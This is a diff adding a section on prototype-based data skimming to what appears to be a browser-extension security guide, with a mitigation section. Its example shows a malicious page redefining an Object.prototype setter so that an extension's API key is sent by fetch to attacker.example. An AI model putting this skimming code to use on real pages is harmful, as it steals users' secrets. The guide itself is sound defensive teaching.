@@ -240,6 +240,51 @@ It is important to note that even using a Shadow DOM for encapsulation may not b
 
 Therefore, using truly separate extension-controlled UIs is the most reliable mitigation.
 
+## 12. Prototype-based Data Skimming
+
+### Vulnerability: Prototype-based Data Skimming
+
+An extension's content script is executed in "isolated world", a JavaScript context separated from the one of a web page. On the other hand, there are some ways for an extension to execute scripts in "main world", a web page's context. For example, an extension can inject a `<script>` tag directly to DOM with `src` attribute pointing to a script of [web accessible resources](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/web_accessible_resources).
+
+When an extension uses sensitive user information in any scripts executed on the web page's context, the data becomes accessible to the page's scripts. So, if the web page is compromised or malicious, the data will be stolen.
+
+The reason why the data becomes accessible is because global objects of a context (sometimes called "built-in objects", "primordials" or "prototypes") can be overwritten to behave differently than usual. This is known as "prototype pollution", "prototype overriding" and so on.
+
+This means that a malicious or compromised webpage can overwrite global objects in its context to steal any data they handle. Please note that objects here include almost everything in the context such as functions. So, if the extension's injected script uses these overwritten objects with sensitive data, it will inadvertently trigger the malicious code, leading to the exfiltration of that data.
+
+### Example: Prototype-based Data Skimming
+
+```javascript
+// Malicious script overwriting all objects' setter for 'apiKey'
+// to send the value to be set towards a server.
+Object.defineProperty(Object.prototype, 'apiKey', {
+    set: function (str) {
+        fetch(`https://attacker.example?data=${str}`);
+        Object.defineProperty(this, 'apiKey', {
+            value: str
+        })
+        return str
+    }
+})
+
+// Extension's script to be executed on a web page's context.
+window.addEventListener('message', (data) => {
+  if (data.apiKey) {
+    // the setter for 'apiKey' is already polluted,
+    // and the below line triggers malicious code and the data is immediately sent.
+    window.apiController.apiKey = data.apiKey;
+  }
+})
+```
+
+### Mitigation: Prototype-based Data Skimming
+
+Please don't use the web page's context when sensitive user information is handled just for a moment. If communication with scripts in the web page's context is necessary, use only non-sensitive, essential information. For example, pass just a result of validation instead of the whole secret token. It's the case even if you use `window.postMessage`, because it can be overwritten also and malicious scripts can add listeners for `message` event.
+
+Please note that it's not recommended to try to get native (not-overwritten) prototypes by some tricks. It's sure that there are some hacks to get native prototypes in a context where other scripts are also executed, but bypasses of these measures, i.e. how to force other scripts to use overwritten prototypes, are often invented.
+
+Also, please don't assume your extension's script can use native prototypes even if it's executed at `document_start` timing. At least, in the case of Chromium browser extension, it's known that the context of a newly created iframe can be tweaked by a web page's script BEFORE the extension's script starts in the iframe event at `document_start` ([official bug issue](https://issues.chromium.org/issues/40202434)).
+
 ## Conclusion
 
 By following these security best practices, developers can build safer browser extensions and protect users from privacy and security threats. Always prioritize least privilege, encryption, and secure coding principles when developing extensions.
